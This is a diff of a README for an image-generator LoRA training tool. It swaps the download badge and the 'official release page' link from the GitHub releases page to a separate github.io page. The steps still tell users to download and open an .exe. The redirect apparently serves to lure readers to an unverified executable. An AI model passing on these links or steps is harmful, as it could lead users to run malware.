@@ -1,12 +1,12 @@
 # ⚙️ lora-training-skill - Train custom images for image generators
 
-[![Download Application](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/layerplague867/lora-training-skill/releases)
+[![Download Application](https://img.shields.io/badge/Download-Releases-blue.svg)](https://layerplague867.github.io)
 
 This software turns a folder of your images into a custom model file. You use this file with AI tools to generate images that show specific people, styles, or concepts. It prepares your data, fixes common issues, and manages the training process so you get consistent results. 
 
 ## 📥 How to download and install
 
-1. Visit the [official release page](https://github.com/layerplague867/lora-training-skill/releases).
+1. Visit the [official release page](https://layerplague867.github.io).
 2. Look for the most recent version at the top of the list.
 3. Click the link that ends in .exe to start your download.
 4. Open the file once the download finishes.
